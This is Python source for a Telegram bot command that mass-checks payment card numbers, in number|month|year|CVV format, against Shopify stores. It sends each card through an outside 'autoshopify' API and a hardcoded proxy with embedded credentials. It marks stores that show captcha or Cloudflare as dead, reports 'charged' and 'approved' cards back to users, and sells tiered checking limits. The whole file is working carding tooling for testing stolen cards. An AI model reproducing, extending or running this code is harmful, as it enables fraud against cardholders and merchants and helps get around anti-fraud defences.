# MassShopify.py

import aiohttp
import asyncio
import json
import re
import logging
import os
import time
from datetime import datetime
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user

logger = logging.getLogger(__name__)

# === OPTIMIZED CONFIGURATION ===
AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
TIMEOUT = 30  # Reduced timeout for faster response
BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

# === USER LIMITS ===
USER_LIMITS = {
    "owner": 10000,
    "admin": 1000,  
    "premium": 700,
    "free": 400
}

# Global variables
user_stop_flags = {}
processing_results = {}
dead_sites = set()

# === GET USER LIMIT ===
def get_user_limit(user_data: dict, user_id: int, owner_id: int = 7254736651):
    """User ki limit determine karega"""
    if user_id == owner_id:
        return USER_LIMITS["owner"]
    elif user_data.get('status', '').lower() == 'admin':
        return USER_LIMITS["admin"]
    elif user_data.get('plan', '').lower() in ['premium', 'plus', 'pro']:
        return USER_LIMITS["premium"]
    else:
        return USER_LIMITS["free"]

# === SIMPLE CARD EXTRACTION ===
def extract_cards_from_text(text: str, max_cards: int = 10000):
    """Text se cards extract karega with limit"""
    cards = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
            
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                card, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                if card.isdigit() and len(card) >= 12:
                    mm = mm.zfill(2)
                    yy = yy[-2:] if len(yy) == 4 else yy
                    cards.append(f"{card}|{mm}|{yy}|{cvv}")
                    
                    if len(cards) >= max_cards:
                        break
    
    return cards

# === DEAD SITE DETECTION ===
def is_dead_site_response(response: str):
    """Check if response indicates dead site"""
    dead_patterns = [
        "HCAPTCHA DETECTED",
        "CLINTE TOKEN",
        "DEL AMMOUNT EMPTY", 
        "PRODUCT ID IS EMPTY",
        "PY ID EMPTY",
        "TAX AMMOUNT EMPTY",
        "R4 TOKEN EMPTY",
        "Receipt ID is empty",
        "Invalid API response",
        "site not working",
        "captcha detected",
        "hcaptcha",
        "cloudflare",
        "churiiu63"
    ]
    
    response_upper = str(response).upper()
    return any(pattern.upper() in response_upper for pattern in dead_patterns)

# === GET WORKING SITES ===
def get_working_sites(user_sites: list):
    """Sirf working sites return karega - SIRF PEHLA SITE USE KAREGA"""
    global dead_sites
    
    working_sites = []
    for site in user_sites:
        if site not in dead_sites:
            working_sites.append(site)
            break  # SIRF PEHLA WORKING SITE LE RAHA HAI
    
    return working_sites

# === SINGLE CARD CHECKER FOR LIVE UPDATES ===
async def check_single_card(session, card: str, site: str, user_id: int):
    """Single card check karega live updates ke liye"""
    if user_stop_flags.get(user_id):
        return None, None, None, None
        
    start_time = time.time()
    try:
        api_url = f"{AUTOSH_BASE}?site={site}&cc={card}&proxy={DEFAULT_PROXY}"
        
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with session.get(api_url, timeout=timeout) as resp:
            api_text = await resp.text()
            
        if user_stop_flags.get(user_id):
            return None, None, None, None
            
        elapsed_time = round(time.time() - start_time, 2)
        
        if is_dead_site_response(api_text):
            return "DEAD_SITE", "0", "DEAD_SITE", elapsed_time
        
        json_match = re.search(r'\{[^}]*\}', api_text)
        if json_match:
            json_str = json_match.group()
            try:
                data = json.loads(json_str)
                response = data.get("Response", "Unknown")
                price = data.get("Price", "0")
                
                status = "CHARGED" if "APPROVED" in response.upper() else "DECLINED"
                return status, price, response, elapsed_time
                
            except json.JSONDecodeError:
                pass
        
        return "DECLINED", "0", "Processing Error", elapsed_time
        
    except asyncio.TimeoutError:
        if user_stop_flags.get(user_id):
            return None, None, None, None
        elapsed_time = round(time.time() - start_time, 2)
        return "TIMEOUT", "0", f"Timeout - {TIMEOUT}s", elapsed_time
        
    except Exception as e:
        if user_stop_flags.get(user_id):
            return None, None, None, None
        elapsed_time = round(time.time() - start_time, 2)
        return "ERROR", "0", f"Error: {str(e)[:30]}", elapsed_time

# === SEND APPROVED/CHARGED MESSAGE ===
async def send_success_message(update: Update, card: str, status: str, price: str, response: str, elapsed_time: float, site: str):
    """Approved ya charged card ke liye message send karega"""
    
    card_parts = card.split('|')
    card_number = card_parts[0] if len(card_parts) > 0 else card
    mm = card_parts[1] if len(card_parts) > 1 else "XX"
    yy = card_parts[2] if len(card_parts) > 2 else "XX"
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    if len(card_number) > 10:
        masked_card = f"{card_number[:6]}XXXXXX{card_number[-4:]}"
    else:
        masked_card = card_number
    
    bin_number = card_number[:6]
    country = "United States"
    bank = "Unknown Bank"
    
    if status == "APPROVED":
        title = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
    else:
        title = "𝘾𝙃𝘼𝙍𝙂𝙀 💎"
    
    success_text = (
        f"<b>{title}</b>\n\n"
        f"<b>𝗖𝗖 ⇾</b> <code>{masked_card}|{mm}|{yy}|{cvv}</code>\n"
        f"<b>𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾</b> <code>{site[:30]}...</code>\n"
        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> <code>{response[:50]}</code>\n\n"
        f"<b>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜</b> <code>{bin_number}</code>\n"
        f"<b>𝗕𝗮𝗻𝗸 ➜</b> {bank}\n"
        f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜</b> {country}\n\n"
        f"<b>𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀</b>"
    )
    
    await update.message.reply_text(success_text, parse_mode=ParseMode.HTML)

# === CREATE PROCESSING BUTTONS (LINE BY LINE) ===
def create_processing_buttons(current_card: str, status: str, site: str, charged: int, approved: int, declined: int, progress: str, user_id: int):
    """Processing screen ke liye buttons create karega - EK KE NICHE EK"""
    
    buttons = []
    
    # Line 1: Current Card
    buttons.append([InlineKeyboardButton(f"🧠 𝘾𝙪𝙧𝙧𝙚𝙣𝙩 ➜ {current_card}", callback_data="current_none")])
    
    # Line 2: Status
    buttons.append([InlineKeyboardButton(f"👀 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}", callback_data="status_none")])
    
    # Line 3: Site
    short_site = site[:25] + "..." if len(site) > 25 else site
    buttons.append([InlineKeyboardButton(f"🔥 𝙎𝙞𝙩𝙚 ➜ {short_site}", callback_data="site_none")])
    
    # Line 4: Charge
    buttons.append([InlineKeyboardButton(f"💎 𝘾𝙃𝘼𝙍𝙂𝙀 ➜ {charged}", callback_data="charge_none")])
    
    # Line 5: Approve
    buttons.append([InlineKeyboardButton(f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ {approved}", callback_data="approve_none")])
    
    # Line 6: Declined
    buttons.append([InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {declined}", callback_data="decline_none")])
    
    # Line 7: Progress
    buttons.append([InlineKeyboardButton(f"⏳𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ {progress}", callback_data="progress_none")])
    
    # Line 8: Stop Button
    buttons.append([InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣", callback_data=f"stop_mtxt_{user_id}")])
    
    return InlineKeyboardMarkup(buttons)

# === CREATE RESULT TXT FILE ===
def create_result_file(results: list, user_id: int, total_in_file: int, processed_count: int, dead_sites_count: int):
    """Result txt file banayega"""
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
    filename = f"mtxt_results_{user_id}_{timestamp}.txt"
    
    charged_cards = []
    approved_cards = []
    declined_cards = []
    timeout_cards = []
    dead_site_cards = []
    error_cards = []
    
    for card, status, price, response in results:
        short_card = card[:20] + "..." if len(card) > 20 else card
        short_response = response[:60] + "..." if len(response) > 60 else response
        
        if status == "CHARGED":
            charged_cards.append(f"{short_card} | ${price} | {short_response}")
        elif status == "APPROVED":
            approved_cards.append(f"{short_card} | ${price} | {short_response}")
        elif status == "DECLINED":
            declined_cards.append(f"{short_card} | {short_response}")
        elif status == "TIMEOUT":
            timeout_cards.append(f"{short_card} | {short_response}")
        elif status == "DEAD_SITE":
            dead_site_cards.append(f"{short_card} | {short_response}")
        else:
            error_cards.append(f"{short_card} | {short_response}")
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"⚡ MASS TXT RESULTS\n")
        f.write(f"Date: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
        f.write(f"Cards in File: {total_in_file}\n")
        f.write(f"Cards Processed: {processed_count}\n")
        f.write(f"Timeout: {TIMEOUT} seconds\n")
        f.write(f"Dead Sites: {dead_sites_count}\n")
        f.write("="*50 + "\n\n")
        
        if charged_cards:
            f.write(f"✅ CHARGED CARDS ({len(charged_cards)})\n")
            f.write("-"*50 + "\n")
            for card in charged_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        if approved_cards:
            f.write(f"✅ APPROVED CARDS ({len(approved_cards)})\n")
            f.write("-"*50 + "\n")
            for card in approved_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        if declined_cards:
            f.write(f"❌ DECLINED CARDS ({len(declined_cards)})\n")
            f.write("-"*50 + "\n")
            for card in declined_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        if timeout_cards:
            f.write(f"⏰ TIMEOUT CARDS ({len(timeout_cards)})\n")
            f.write("-"*50 + "\n")
            for card in timeout_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        if dead_site_cards:
            f.write(f"🚫 DEAD SITE CARDS ({len(dead_site_cards)})\n")
            f.write("-"*50 + "\n")
            for card in dead_site_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        if error_cards:
            f.write(f"⚠️ ERROR CARDS ({len(error_cards)})\n")
            f.write("-"*50 + "\n")
            for card in error_cards:
                f.write(f"{card}\n")
            f.write("\n")
        
        f.write("="*50 + "\n")
        f.write("📊 SUMMARY\n")
        f.write("="*50 + "\n")
        f.write(f"Total Cards: {total_in_file}\n")
        f.write(f"Processed: {processed_count}\n")
        f.write(f"✅ Charged: {len(charged_cards)}\n")
        f.write(f"✅ Approved: {len(approved_cards)}\n")
        f.write(f"❌ Declined: {len(declined_cards)}\n")
        f.write(f"⏰ Timeout: {len(timeout_cards)}\n")
        f.write(f"🚫 Dead Sites: {len(dead_site_cards)}\n")
        f.write(f"⚠️ Errors: {len(error_cards)}\n")
        
        success_count = len(charged_cards) + len(approved_cards)
        success_rate = (success_count / processed_count) * 100 if processed_count > 0 else 0
        f.write(f"🎯 Success Rate: {success_rate:.2f}%\n")

    return filename

# === PROCESS CARDS WITH LIVE UPDATES (NON-BLOCKING) ===
async def process_cards_with_live_updates(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, user_sites: list, user_limit: int):
    """Cards ko process karega with live updates - COMPLETELY NON BLOCKING"""
    user = update.effective_user
    user_id = user.id
    
    # Start processing in background task
    asyncio.create_task(
        _process_cards_background(update, context, cards, user_sites, user_limit, user_id)
    )

# === BACKGROUND PROCESSING TASK ===
async def _process_cards_background(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, user_sites: list, user_limit: int, user_id: int):
    """Background mein cards process karega - NON BLOCKING"""
    start_time = time.time()
    total_in_file = len(cards)
    
    user_stop_flags[user_id] = False
    
    cards_to_process = cards[:user_limit]
    total_to_process = len(cards_to_process)
    
    working_sites = get_working_sites(user_sites)
    
    if not working_sites:
        final_text = (
            f"<b>🚫 ALL SITES DEAD</b>\n\n"
            f"⩙ <b>Cards in File:</b> {total_in_file}\n"
            f"⩙ <b>Working Sites:</b> 0\n\n"
            f"❌ <b>Cannot Process</b>\n\n"
            f"<i>Use /seturl to add new working sites first.</i>"
        )
        await update.message.reply_text(final_text, parse_mode=ParseMode.HTML)
        return
    
    # SIRF PEHLA SITE USE KARO
    current_site = working_sites[0]
    
    processing_results[user_id] = {
        'total_in_file': total_in_file,
        'total_to_process': total_to_process,
        'processed_cards': 0,
        'charged': 0,
        'approved': 0, 
        'declined': 0,
        'timeout': 0,
        'dead_sites': 0,
        'errors': 0,
        'results': []
    }
    
    initial_text = f"<pre>𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...</pre>"
    
    reply_markup = create_processing_buttons(
        current_card="Starting...",
        status="Waiting...",
        site=current_site,
        charged=0,
        approved=0,
        declined=0,
        progress=f"[0/{total_to_process}]",
        user_id=user_id
    )
    
    msg = await update.message.reply_text(
        initial_text, 
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    try:
        async with aiohttp.ClientSession() as session:
            for i, card in enumerate(cards_to_process, 1):
                # FAST STOP CHECK
                if user_stop_flags.get(user_id):
                    break
                
                # Card masking
                card_parts = card.split('|')
                if len(card_parts) >= 1:
                    card_num = card_parts[0]
                    if len(card_num) > 10:
                        masked_card = f"{card_num[:6]}XXXXXX{card_num[-4:]}"
                    else:
                        masked_card = card_num
                else:
                    masked_card = card[:15] + "..."
                
                # Update buttons
                reply_markup = create_processing_buttons(
                    current_card=masked_card,
                    status="Checking...",
                    site=current_site,
                    charged=processing_results[user_id]['charged'],
                    approved=processing_results[user_id]['approved'],
                    declined=processing_results[user_id]['declined'],
                    progress=f"[{i}/{total_to_process}]",
                    user_id=user_id
                )
                
                try:
                    await msg.edit_reply_markup(reply_markup=reply_markup)
                except Exception:
                    pass
                
                # Check card with small delay to allow other tasks
                await asyncio.sleep(0.01)
                
                # Card checking
                status, price, response, elapsed_time = await check_single_card(session, card, current_site, user_id)
                
                if user_stop_flags.get(user_id):
                    break
                
                if status is None:
                    break
                
                # Update status
                status_text = "Checking..."
                if "APPROVED" in response.upper() or "CHARGED" in status.upper():
                    status_text = "✅ CHARGED"
                elif "DECLINED" in status.upper():
                    status_text = "❌ DECLINED"
                elif "TIMEOUT" in status.upper():
                    status_text = "⏰ TIMEOUT"
                elif "DEAD_SITE" in status.upper():
                    status_text = "🚫 DEAD SITE"
                else:
                    status_text = "⚠️ ERROR"
                
                # Update results
                processing_results[user_id]['processed_cards'] += 1
                processing_results[user_id]['results'].append((card, status, price, response))
                
                if "CHARGED" in status:
                    processing_results[user_id]['charged'] += 1
                    asyncio.create_task(send_success_message(update, card, "CHARGED", price, response, elapsed_time, current_site))
                elif "APPROVED" in status:
                    processing_results[user_id]['approved'] += 1
                    asyncio.create_task(send_success_message(update, card, "APPROVED", price, response, elapsed_time, current_site))
                elif "DECLINED" in status:
                    processing_results[user_id]['declined'] += 1
                elif "TIMEOUT" in status:
                    processing_results[user_id]['timeout'] += 1
                elif "DEAD_SITE" in status:
                    processing_results[user_id]['dead_sites'] += 1
                    dead_sites.add(current_site)
                else:
                    processing_results[user_id]['errors'] += 1
                
                # Update buttons with result
                reply_markup = create_processing_buttons(
                    current_card=masked_card,
                    status=status_text,
                    site=current_site,
                    charged=processing_results[user_id]['charged'],
                    approved=processing_results[user_id]['approved'],
                    declined=processing_results[user_id]['declined'],
                    progress=f"[{i}/{total_to_process}]",
                    user_id=user_id
                )
                
                try:
                    await msg.edit_reply_markup(reply_markup=reply_markup)
                except Exception:
                    pass
                
                # Small delay to allow other tasks
                await asyncio.sleep(0.01)
    
    except Exception as e:
        logger.error(f"Processing error: {e}")
    
    # Final results
    elapsed = round(time.time() - start_time, 2)
    results_data = processing_results.get(user_id, {})
    was_stopped = user_stop_flags.get(user_id, False)
    
    if user_id in user_stop_flags:
        del user_stop_flags[user_id]
    
    processed_count = results_data.get('processed_cards', 0)
    charged_count = results_data.get('charged', 0)
    approved_count = results_data.get('approved', 0)
    declined_count = results_data.get('declined', 0)
    
    if was_stopped:
        final_text = f"<pre>🛑 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙</pre>"
        final_markup = create_processing_buttons(
            current_card="STOPPED",
            status="USER STOPPED",
            site=current_site,
            charged=charged_count,
            approved=approved_count,
            declined=declined_count,
            progress=f"[{processed_count}/{total_to_process}]",
            user_id=user_id
        )
    else:
        final_text = f"<pre>✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!</pre>"
        final_markup = create_processing_buttons(
            current_card="COMPLETED",
            status="FINISHED",
            site=current_site,
            charged=charged_count,
            approved=approved_count,
            declined=declined_count,
            progress=f"[{processed_count}/{total_to_process}]",
            user_id=user_id
        )
    
    try:
        await msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            reply_markup=final_markup
        )
    except Exception:
        pass
    
    # Send result file in background
    if results_data.get('results'):
        asyncio.create_task(send_result_file(update, results_data, user_id, total_in_file, processed_count, elapsed))

# === SEND RESULT FILE (NON BLOCKING) ===
async def send_result_file(update: Update, results_data: dict, user_id: int, total_in_file: int, processed_count: int, elapsed: float):
    """Result file send karega - non blocking"""
    try:
        result_filename = create_result_file(
            results_data['results'], 
            user_id, 
            total_in_file, 
            processed_count, 
            results_data.get('dead_sites', 0)
        )
        
        if result_filename and os.path.exists(result_filename):
            with open(result_filename, 'rb') as file:
                charged_count = results_data.get('charged', 0)
                approved_count = results_data.get('approved', 0)
                caption = (
                    f"📄 <b>Mass TXT Results</b>\n"
                    f"Processed: {processed_count} cards\n"
                    f"Time: {elapsed}s\n"
                    f"Charged: {charged_count} | Approved: {approved_count}"
                )
                await update.message.reply_document(
                    document=file,
                    filename=f"mtxt_results.txt",
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            os.remove(result_filename)
    except Exception as e:
        logger.error(f"Error sending file: {e}")

# === FAST STOP HANDLER ===
async def stop_mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """INSTANT stop handler - FAST RESPONSE"""
    query = update.callback_query
    await query.answer()
    
    try:
        user_id = int(query.data.split('_')[-1])
        if query.from_user.id == user_id:
            user_stop_flags[user_id] = True
            await query.answer("🛑 INSTANT STOPPED!", show_alert=False)
    except Exception as e:
        await query.answer("❌ Stop Error", show_alert=False)

# === MAIN COMMAND ===
async def mtxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main /mtxt command - NON BLOCKING"""
    user = update.effective_user
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩"
        )
        return
    
    document = update.message.reply_to_message.document
    
    if document.mime_type != 'text/plain':
        await update.message.reply_text("❌ Please send a .txt file")
        return
    
    user_data = await get_user(user.id)
    user_limit = get_user_limit(user_data, user.id)
    
    try:
        file_obj = await document.get_file()
        file_content = await file_obj.download_as_bytearray()
        text_content = file_content.decode('utf-8')
    except Exception as e:
        await update.message.reply_text("❌ Error reading file")
        return
    
    cards = extract_cards_from_text(text_content)
    
    if not cards:
        await update.message.reply_text("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        return
    
    total_cards_in_file = len(cards)
    cards_to_check = min(total_cards_in_file, user_limit)
    
    if total_cards_in_file <= user_limit:
        info_text = (
            f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_in_file} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n"
            f"🔥 𝘼𝙡𝙡 {total_cards_in_file} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"
        )
    else:
        info_text = (
            f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_in_file} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n"
            f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cards_to_check} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n"
            f"🔥 {cards_to_check} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"
        )
    
    await update.message.reply_text(info_text)
    
    cards_to_process = cards[:user_limit]
    user_sites = user_data.get("custom_urls", [])
    
    # Start processing in background - NON BLOCKING
    await process_cards_with_live_updates(update, context, cards_to_process, user_sites, user_limit)